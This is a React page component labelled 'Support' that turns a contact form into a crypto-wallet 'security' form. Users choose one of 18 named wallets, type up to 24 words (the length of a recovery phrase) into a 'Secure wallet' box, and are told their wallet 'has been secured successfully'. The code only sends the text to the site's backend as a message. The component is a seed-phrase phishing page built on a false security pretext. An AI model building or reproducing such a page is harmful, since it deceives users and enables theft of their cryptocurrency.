import { useState } from "react";
import { useSendUserContactMessage } from "@workspace/api-client-react";
import { DashboardLayout } from "@/components/dashboard-layout";

const MAX_WORDS = 24;
const CRYPTO_WALLETS = [
  "MetaMask",
  "Trust Wallet",
  "Coinbase Wallet",
  "WalletConnect",
  "Phantom",
  "Exodus",
  "Ledger",
  "Rainbow",
  "Uniswap",
  "Atomic Wallet",
  "Crypto.com DeFi",
  "Argent",
  "1inch",
  "imToken",
  "MyEtherWallet",
  "Zerion",
  "Bitkeep",
  "SafePal",
];

export default function Support() {
  const [subject, setSubject] = useState("");
  const [message, setMessage] = useState("");
  const [sent, setSent] = useState(false);
  const [error, setError] = useState("");
  const wordCount = message.trim() ? message.trim().split(/\s+/).length : 0;

  const { mutate, isPending } = useSendUserContactMessage({
    mutation: {
      onSuccess: () => {
        setSubject("");
        setMessage("");
        setError("");
        setSent(true);
      },
      onError: (err: any) => {
        setSent(false);
        setError(err?.data?.error ?? "Your message could not be sent. Please try again.");
      },
    },
  });

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setSent(false);
    setError("");
    mutate({ data: { subject: subject.trim(), message: message.trim() } });
  };

  const handleMessageChange = (value: string) => {
    const words = value.trim().split(/\s+/).filter(Boolean);
    setMessage(words.length > MAX_WORDS ? words.slice(0, MAX_WORDS).join(" ") : value);
  };

  return (
    <DashboardLayout>
      <div className="mx-auto max-w-[1100px] space-y-6 px-4 py-6 sm:px-6 lg:px-9 lg:py-8">
        <section className="sl-rise max-w-3xl rounded-2xl border border-border bg-card p-5 sm:p-7">
          <form onSubmit={handleSubmit} className="space-y-5">
            {error && (
              <div role="alert" className="rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
                {error}
              </div>
            )}
            {sent && (
              <div role="status" className="flex items-start gap-2 rounded-xl border border-emerald-400/25 bg-emerald-400/10 px-4 py-3 text-sm text-emerald-300">
                <ShieldIcon className="mt-0.5 h-5 w-5 shrink-0" />
                Your wallet has been secured successfully.
              </div>
            )}

            <div className="space-y-2">
              <label htmlFor="message-subject" className="text-sm font-medium text-foreground">Select crypto wallet</label>
              <select
                id="message-subject"
                value={subject}
                onChange={(event) => setSubject(event.target.value)}
                className="h-11 w-full rounded-xl border border-border bg-input px-3.5 text-sm text-foreground outline-none transition focus:ring-2 focus:ring-ring"
                required
                data-testid="select-crypto-wallet"
              >
                <option value="" disabled>Select a crypto wallet</option>
                {CRYPTO_WALLETS.map((wallet) => <option key={wallet} value={wallet}>{wallet}</option>)}
              </select>
            </div>

            <div className="space-y-2">
              <div className="flex items-center justify-between gap-3">
                <label htmlFor="admin-message" className="text-sm font-medium text-foreground">Secure wallet</label>
                <span className="text-[11px] text-muted-foreground">{wordCount}/{MAX_WORDS}</span>
              </div>
              <textarea
                id="admin-message"
                value={message}
                onChange={(event) => handleMessageChange(event.target.value)}
                className="min-h-[190px] w-full resize-y rounded-xl border border-border bg-input px-3.5 py-3 text-sm leading-6 text-foreground outline-none transition focus:ring-2 focus:ring-ring"
                required
              />
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="inline-flex h-11 w-full items-center justify-center gap-2 rounded-xl bg-primary px-5 text-sm font-semibold text-primary-foreground transition hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-60 sm:w-auto"
              data-testid="button-send-admin-message"
            >
              {isPending ? "Securing wallet..." : "Secure wallet"}
              {!isPending && <ArrowIcon className="h-4 w-4" />}
            </button>
          </form>
        </section>
      </div>
    </DashboardLayout>
  );
}

function ShieldIcon({ className }: { className?: string }) {
  return <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path d="M12 3 5 6v5c0 4.6 2.9 8.6 7 10 4.1-1.4 7-5.4 7-10V6l-7-3Z" strokeLinejoin="round" /><path d="m8.5 12 2.2 2.2 4.8-5" strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.2} /></svg>;
}

function ArrowIcon({ className }: { className?: string }) {
  return <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path d="M5 12h13M13 6l6 6-6 6" /></svg>;
}